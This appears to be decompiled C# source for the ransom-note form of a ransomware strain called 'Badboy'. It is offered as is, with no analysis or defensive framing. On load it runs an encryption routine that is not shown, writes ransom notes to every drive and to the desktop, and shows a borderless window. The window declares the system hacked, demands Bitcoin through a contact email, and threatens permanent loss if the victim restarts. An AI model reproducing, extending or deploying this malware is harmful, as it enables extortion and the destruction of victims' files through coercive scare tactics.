using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Badboymnb;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private TextBox textBox1;

	private Label label2;

	private TextBox textBox2;

	private Label label3;

	private Label label4;

	private Label label5;

	public static string Message { get; } = "All your data has been locked us. You want to return? Contact to Email: alix1011@protonmail.com";


	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = Encryption.Run();
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text2 in array)
		{
			try
			{
				File.WriteAllText(text2 + "\\ReadME-BadboyEncryption.txt", Message + " Your Personal Key : " + text);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			File.WriteAllText(Main.DesktopDirectory + "\\ReadME-BadboyEncryption.txt", Message + " Your Personal Key : " + text);
		}
		catch (Exception)
		{
		}
		((Control)textBox1).set_Text(text);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Expected O, but got Unknown
		//IL_0229: Unknown result type (might be due to invalid IL or missing references)
		//IL_0233: Expected O, but got Unknown
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d2: Expected O, but got Unknown
		//IL_035b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0365: Expected O, but got Unknown
		//IL_03ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f8: Expected O, but got Unknown
		//IL_0523: Unknown result type (might be due to invalid IL or missing references)
		//IL_052d: Expected O, but got Unknown
		label1 = new Label();
		textBox1 = new TextBox();
		label2 = new Label();
		textBox2 = new TextBox();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(12, 117));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(158, 25));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Personal Key : ");
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.Lime);
		((Control)textBox1).set_Location(new Point(17, 158));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(755, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 36f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(51, 32));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(701, 55));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("Your System Has Been Hacked");
		((Control)textBox2).set_BackColor(Color.Black);
		((Control)textBox2).set_Font(new Font("Lucida Sans Typewriter", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(Color.Lime);
		((Control)textBox2).set_Location(new Point(17, 395));
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(755, 20));
		((Control)textBox2).set_TabIndex(4);
		((Control)textBox2).set_Text("Contact Me : alix1011@protonmail.com");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(12, 354));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(253, 25));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("My Wallet In Blockchain For Pay Contact Me: alix1011@protonmail.com");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Red);
		((Control)label4).set_Location(new Point(12, 207));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(531, 50));
		((Control)label4).set_TabIndex(5);
		((Control)label4).set_Text("Warning: Please Don't Restart or Shutdown Your PC , \r\nIf do it Your Pesonal Files Permanently Crypted.");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 15.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(Color.Red);
		((Control)label5).set_Location(new Point(12, 269));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(826, 50));
		((Control)label5).set_TabIndex(5);
		((Control)label5).set_Text("For Decrypt Your Personal Just Pay Btc, After Pay You Can send personal key to \\r\\n\r\nMy Email: alix1011@protonmail.com");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(797, 450));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_Font(new Font("Monotype Corsiva", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Encryptor By Badboy");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
